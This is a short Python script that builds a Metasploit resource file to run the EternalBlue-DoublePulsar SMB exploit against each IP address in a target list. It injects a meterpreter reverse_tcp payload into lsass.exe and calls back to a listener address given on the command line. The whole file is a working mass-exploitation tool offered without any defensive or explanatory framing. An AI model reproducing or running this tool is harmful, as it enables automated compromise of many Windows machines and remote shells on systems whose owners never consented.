import argparse
parser = argparse.ArgumentParser()
parser.add_argument("lhost", help="enter listener ip address")
args = parser.parse_args()

exploit = "exploit/windows/smb/Eternalblue-Doublepulsar-Metasploit/eternalblue_doublepulsar"
payload = "windows/x64/meterpreter/reverse_tcp"

with open('out.rc','w') as f2:
    f2.write("use " + exploit + "\n")
    f2.write("set processinject lsass.exe" + "\n")
    f2.write("set targetarchitecture x64" + "\n")
    f2.write("set payload " + payload + "\n")
    f2.write("set LHOST " + args.lhost + "\n")

with open('ip.txt') as f1:
    with open('out.rc', 'a') as f2:
        lines = f1.readlines()
        for i, line in enumerate(lines):
            f2.write("set rhost " + line.strip() + "\n")
            f2.write("exploit")
            f2.write("\n")
